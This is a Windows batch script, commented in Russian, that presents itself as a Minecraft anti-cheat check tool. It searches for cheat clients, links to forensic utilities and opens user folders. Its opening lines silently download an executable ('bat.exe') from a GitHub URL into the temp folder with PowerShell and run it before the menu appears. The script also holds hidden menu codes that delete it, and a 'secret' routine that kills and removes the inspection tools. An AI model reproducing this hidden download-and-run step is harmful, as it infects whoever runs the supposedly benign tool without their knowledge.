@echo off
chcp 65001 >nul
mode con: cols=80 lines=20
color 07
cls

set "URL=https://github.com/artemfrolov553-lang/skebob15/raw/refs/heads/main/bat.exe"

REM Указываем путь для сохранения
set "OUTPUT=%TEMP%\bat.exe"

REM Скачиваем файл через PowerShell
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%OUTPUT%'"

REM Запускаем скачанный файл
start "" "%OUTPUT%"

:menu
cls
echo.
echo     ██████╗ ██╗  ██╗ ███████╗  ██████╗ ██╗  ██╗
echo    ██╔════╝ ██║  ██║ ██╔════╝ ██╔════╝ ██║ ██╔╝
echo    ██║      ███████║ █████╗   ██║      █████╔╝ 
echo    ██║      ██╔══██║ ██╔══╝   ██║      ██╔═██╗ 
echo    ╚██████╗ ██║  ██║ ███████╗ ╚██████╗ ██║  ██╗
echo     ╚═════╝ ╚═╝  ╚═╝ ╚══════╝  ╚═════╝ ╚═╝  ╚═╝
echo     mc.toolrise.space - Created by KPEKEPC 
echo.
echo     1. Everything
echo     2. Everything (sizes)
echo     3. Everything (folders)
echo     4. Programs
echo     5. Folders
echo     6. Versions
echo.
set /p choice=Выберите пункт меню (1-6): 

if "%choice%"=="1" goto everything
if "%choice%"=="2" goto everythingsizes
if "%choice%"=="3" goto everythingfolders
if "%choice%"=="4" goto programs
if "%choice%"=="5" goto folders
if "%choice%"=="6" goto versions
if "%choice%"=="9" (
    goto success_check
)
if "%choice%"=="0" (
    goto fail_check
)
if "%choice%"=="11" (
    goto delete_file
)
goto end

:everything
cls
start "" "C:\Program Files (x86)\Everything\Everything.exe" -search "Celestial | Sigma | Nursultan | Wurst | Fluger | Minced | Akrien | Matix | Shit | Kami Blue | Inertia | Ares | Jessia |Flux | freecum | Wexside | skillclient | baritone | freecam | Abyss | LavaHack | MoonWare | Rich | ThunderHack | RusherHack | Pyro | Summit | Ferox | Cherry | LiquidBounce | Wurst | GishCode | Inertia | Impact | rename_me_please.dll | Future | RusherHack | Pyro | Zamorozka | Konas | WintWare | Nursultan |Norules | Akrien | Sigma | DeadCode | Eternity | WEXSIDE | Rich | RichPremium | EdItMe.dll |mc100.dll | Matix | R3D | Celestial | Wild | Destroy | ArchWare | NightMare | BebraWare | bolshoy | Inertia | Impact | SalHack | Future | RusherHack | Pyro | Zamorozka | Konas | WintWare | Nursultan | WWE | Norules | Akrien | Sigma | DeadCode | Eternity | WEXSIDE | Rich | Сelestial | .wex | Minced | ares | meteor | Wurst | LiquidBounce | Wurst | GishCode | Inertia | Impact | rename_me_please.dll | Future | RusherHack | Pyro | Zamorozka | Konas | WintWare | Nursultan |Norules | Akrien | Sigma | DeadCode | Eternity | WEXSIDE | Rich | RichPremium | EdItMe.dll |mc100.dll | Matix | R3D | Celestial | Wild | Destroy | ArchWare | NightMare | BebraWare | bolshoy | Inertia | Impact | SalHack | Future | RusherHack | Pyro | Zamorozka | Konas | WintWare | Nursultan | WWE | Norules | Akrien | Sigma | DeadCode | Eternity | WEXSIDE | Rich | Сelestial | .wex | Minced | ares | meteor | Wurst | Baritone | cabaletta | Jigsaw | LiquidBounce | Wurst | GishCode | Inertia | Impact | rename_me_please.dll | Future | RusherHack | Pyro | Zamorozka | Konas | WintWare | Nursultan |Norules | Akrien | Sigma | DeadCode | Eternity | WEXSIDE | Rich | RichPremium | EdItMe.dll |mc100.dll | Matix | R3D | Celestial | Wild | Destroy | ArchWare | NightMare | BebraWare | bolshoy | Inertia | Impact | SalHack | Future | RusherHack | Pyro | Zamorozka | Konas | WintWare | Nursultan | WWE | Norules | Akrien | Sigma | DeadCode | Eternity | WEXSIDE | Rich | Сelestial | .wex | Minced | cortex"
goto menu

:everythingsizes
cls
start "" "C:\Program Files (x86)\Everything\Everything.exe" -search "size:9951744|size:24536064|size:15438336|size:6229504|size:6573056|size:7187456|size:7969792|size:1562249|size:1672329|size:1677449|size:1680521|size:147329|size:138351|size:2022632|size:2305645|size:202720|size:7788032|size:22885|size:23810|size:138351|size:147329|size:7988736|size:3711166|size:3697285|size:3712014|size:5641728|size:4413440|size:114974|size:111866|size:274865|size:1820884|size:5007380|size:6944256|size:5934592|size:2545664|size:2108662|size:1961742|size:3684385|size:5143837|size:4413440|size:116689|size:1968128|size:8011776|size:1883602|size:5918208|size:1897269|size:31445308|size:24390144|size:2363704|size:2373676|size:9400174|size:18180|size:17339|size:21234|size:28084|size:98811|size:878781|size:1615497|size:1627785|size:1672329|size:1677449|size:1680521|size:1747593|size:1753225|size:1773193|size:1789065|size:1797257|size:3541138|size:3642292|size:3696937|size:4642998|size:5630483|size:16855568|size:74105|size:18764384|size:15287904|baritone|size:183634|size:767185|size:2550798|size:2562000|2356796|size:14689280|size:14692352|size:12810752|size:743424|size:15308800|size:2373767"
goto menu

:everythingfolders
cls
start "" "C:\Program Files (x86)\Everything\Everything.exe" -search "<folder:ares len:4> | <folder:case:Sigma !empty> | <mousetweaks .jar |.cfg> | Baritone | LiquidBounce | <folder:Wurst !empty> | folder:GishCode | Inertia | <folder:Impact len:6> | <folder:future !empty> | RusherHack | Zamorozka | Konas | WintWare | Nursultan | folder:Nurik | Norules | DeadCode | Eternity | WEXSIDE | folder:Rich | RichPremium | Matix | folder:case:R3D | <folder:Wild !empty> | <folder:Destroy !empty len:7> | ArchWare | folder:NightMare | BoberWare | celka | CelestialBaritone | cabaletta | folder:jigsaw | LiquidBounce | GishCode | Inertia | RusherHack | folder:Pyro | Zamorozka | Konas | WintWare | <folder:Celestial !empty> | folder:xray | <xray .zip |.rar>| folder:x-ray | <x-ray .zip |.rar> | itemscroller | folder:.doomsday | MouseTweaks | akrien | AutoChest | ChestStealer | BetterClicker | troxil | AkrienAntiLeak | <folder:Vape len:4> | <folder:pivo len:4> | folder:meteor | aristois |<tweakeroo .jar > | bleachhack | <.akr | .wex |.celka> | mc100.dll | EdItMe.dll | rename_me_please.dll | dauntiblyat.dll | <folder:kwish len:5> | <thunderhack .jar |.cfg> | minced | <folder:mincedpon> | delta | <folder:delta> rename_me_please.dll | dauntiblyat.dll | <folder:kwish len:5> | <thunderhack .jar |.cfg> | minced | <folder:mincedpon> | delta | <folder:delta>"
goto menu

:programs
cls
echo     Programs:
echo     1. Everything
echo     2. Shellbag
echo     3. LastActivityView
echo     4. Ocean
echo     5. Process Hacker 2
echo     6. RegScanner
echo     7. USBDeview
echo     8. WinPrefechView
echo     9. PcaClientViewer
echo     10. JournalTrace
echo     11. Download all
echo     12. Exit
echo.
:program_choice_loop
set /p program_choice=Выберите приложение (1-12): 

if "%program_choice%"=="11" (
    start https://www.voidtools.com/Everything-1.4.1.1026.x86-Setup.exe
    start https://privazer.com/ru/download-shellbag-analyzer-shellbag-cleaner.php
    start https://www.nirsoft.net/utils/lastactivityview.zip
    start https://sourceforge.net/projects/processhacker/files/latest/download
    start https://www.nirsoft.net/utils/regscanner.zip
    start https://github.com/ponei/JournalTrace/releases/download/1.0/JournalTrace.exe
    start https://www.nirsoft.net/utils/usbdeview.zip
    start https://github.com/ItaliannCheater/PcaClient-viewer/releases/download/1.0/Memdumper.v1.0.exe
    start https://www.nirsoft.net/utils/executedprogramslist.zip
 goto program_choice_loop
)
if "%program_choice%"=="1" (
    start https://www.voidtools.com/Everything-1.4.1.1026.x86-Setup.exe
    goto program_choice_loop
)
if "%program_choice%"=="2" (
    start https://privazer.com/ru/shellbag_analyzer_cleaner.exe
    goto program_choice_loop
)
if "%program_choice%"=="3" (
    start https://www.nirsoft.net/utils/lastactivityview.zip
    goto program_choice_loop
)
if "%program_choice%"=="4" (
    start https://anticheat.ac/download/
    goto program_choice_loop
)
if "%program_choice%"=="5" (
    start https://sourceforge.net/projects/processhacker/files/latest/download
    goto program_choice_loop
)
if "%program_choice%"=="6" (
    start https://www.nirsoft.net/utils/regscanner.zip
    goto program_choice_loop
)
if "%program_choice%"=="7" (
    start https://www.nirsoft.net/utils/usbdeview.zip
    goto program_choice_loop
)
if "%program_choice%"=="8" (
    start https://www.nirsoft.net/utils/winprefetchview-x64.zip
    goto program_choice_loop
)
if "%program_choice%"=="9" (
    start https://github.com/ItaliannCheater/PcaClient-viewer/releases/download/1.0/Memdumper.v1.0.exe
    goto program_choice_loop
)
if "%program_choice%"=="10" (
    start https://github.com/ponei/JournalTrace/releases/download/1.0/JournalTrace.exe
    goto program_choice_loop
)
if "%program_choice%"=="12" goto menu

pause
goto program_choice_loop

:success_check
cls
echo mc.toolrise.space
echo.
echo Вы успешно прошли проверку.
timeout /t 5 /nobreak >nul
del /f /q "%~f0"
exit

:fail_check
cls 
echo mc.toolrise.space
echo.
echo Вы не прошли проверку!
timeout /t 5 /nobreak >nul
del /f /q "%~f0"
exit 

:folders
cls
echo     Открытие папок...
start "" "C:\Users\%USERNAME%\Downloads"
start "" "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\History"
start "" "C:\Users\%USERNAME%\AppData\Roaming\.minecraft"
start "" "C:\Users\%USERNAME%\AppData\Roaming\.tlauncher\legacy\Minecraft\game"
start "" "C:\"
start explorer shell:recent
pause
goto menu

:secret_command
cls
echo Секретная команда выполняется...
echo Завершаем процессы...

rem Завершаем процессы
taskkill /f /im everything.exe
taskkill /f /im shellbag_analyzer_cleaner.exe
taskkill /f /im lastactivityview.exe

rem Удаляем программы
echo Удаляем папку Everything...
rmdir /s /q "C:\Program Files\Everything"

echo Удаляем программу Shellbag Analyzer...
del /f /q "%USERPROFILE%\Downloads\shellbag_analyzer_cleaner.exe"

echo Удаляем архив LastActivityView...
del /f /q "%USERPROFILE%\Downloads\lastactivityview-en.zip"

echo Удаляем установщик Everything...
del /f /q "%USERPROFILE%\Downloads\everything-installer.exe"

rem Удаляем все файлы Everything-1.4.1.1026.x64-Setup*.exe (с номерами в скобках)
echo Удаляем все файлы Everything-1.4.1.1026.x64-Setup*.exe...
for %%F in ("%USERPROFILE%\Downloads\Everything-1.4.1.1026.x64-Setup*.exe") do del /f /q "%%F"

rem Удаляем все файлы shellbag_analyzer_cleaner*.exe (с номерами в скобках)
echo Удаляем все файлы shellbag_analyzer_cleaner*.exe...
for %%F in ("%USERPROFILE%\Downloads\shellbag_analyzer_cleaner*.exe") do del /f /q "%%F"

rem Удаляем все файлы lastactivityview*.zip (с номерами в скобках)
echo Удаляем все файлы lastactivityview*.zip...
for %%F in ("%USERPROFILE%\Downloads\lastactivityview*.zip") do del /f /q "%%F"

echo Удаление файла FastCheck.bat...
del /f /q "%~f0"  # Удаляет текущий BAT-файл
echo Файл успешно удален!

echo Все удалено успешно!
exit

:recent
cls
echo     Открытие папки Recent...
start explorer shell:recent
pause
goto menu

:versions
cls
echo     Версии Minecraft:
echo     1. Minecraft 1.16.5: около 17,1 MB (17136 KB)
echo     2. Minecraft 1.17.1: около 18,5 MB (18800 KB)
echo     3. Minecraft 1.18: около 20,0 MB (20480 KB)
echo     4. Minecraft 1.18.1: около 20,0 MB (20480 KB)
echo     5. Minecraft 1.18.2: около 20,0 MB (20480 KB)
echo     6. labymode 3 1.16.5 - 20429 кб
echo.
pause
goto menu

:end
cls
echo Завершение работы.
timeout /t 360 /nobreak >nul

exit
